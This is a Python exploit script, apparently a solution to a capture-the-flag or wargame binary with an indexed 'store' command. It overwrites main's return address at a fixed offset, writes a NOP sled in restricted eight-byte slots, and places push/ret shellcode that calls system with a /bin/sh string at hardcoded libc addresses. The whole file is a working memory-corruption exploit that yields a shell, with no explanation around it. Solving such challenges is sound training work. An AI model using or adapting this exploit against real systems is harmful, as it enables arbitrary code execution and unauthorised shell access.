#!/usr/bin/env python
import sys
import struct
from pwn import *

def store(idx, val):
    assert idx%3 != 0
    o='store\n'
    if type(val)==type(''):
        val=struct.unpack("<I",val)[0]
    o+='%u\n' % val
    o+='%u\n' % idx
    return o

def prepare8(idx, instrbytes):
    o=''
    o+='\x90'*(6-len(instrbytes))
    o+=instrbytes
    o+='\xeb\x04'
    return store(idx, o[:4])+store(idx+1,o[4:])

def increment_idx(idx, num):
    if(idx+num) % 3 == 0:
        return num+1
    else:
        return num

def exp():
    retaddr=0xbffff52c
    retsystem=0xb7e63190
    binsh=0xb7f83a24

    # offset: 109 dwords

    if len(sys.argv) > 1:
        retaddr=int(sys.argv[1],16)

        sys.stderr.write("Return address: 0x%08x" % retaddr)

    ret1=struct.pack("<I", retaddr)
    ret2=struct.pack("<I", retsystem)
    param=struct.pack("<I", binsh)

    buf=''

    # Overwriting main's return address

    buf+=store(109,ret1)

    nopsled =[x for x in range(40) if x % 3 != 0 and x > 0 and (x+1) % 3 != 0]
    idx=0
    for i in  nopsled:
        buf+=prepare8(i,"\x90")
    idx+=increment_idx(idx,40)

    # Simple return into system (opcode 0x68 represents push on x68)/(0xc3 represents return)
    buf+=prepare8(idx,"\x68"+param)
    idx+=increment_idx(idx,2)

    # junk
    buf+=prepare8(idx,"\x68"+"CCCC")
    idx+=increment_idx(idx,2)

    # system(...)
    buf+=prepare8(idx,"\x68"+ret2)
    idx+=increment_idx(idx,2)


    buf+=prepare8(idx,"\xc3")
    idx+=increment_idx(idx,2)

    buf+="quit\n"

    sys.stdout.write(buf)


def main():
    exp()

if __name__ == '__main__':
    main()
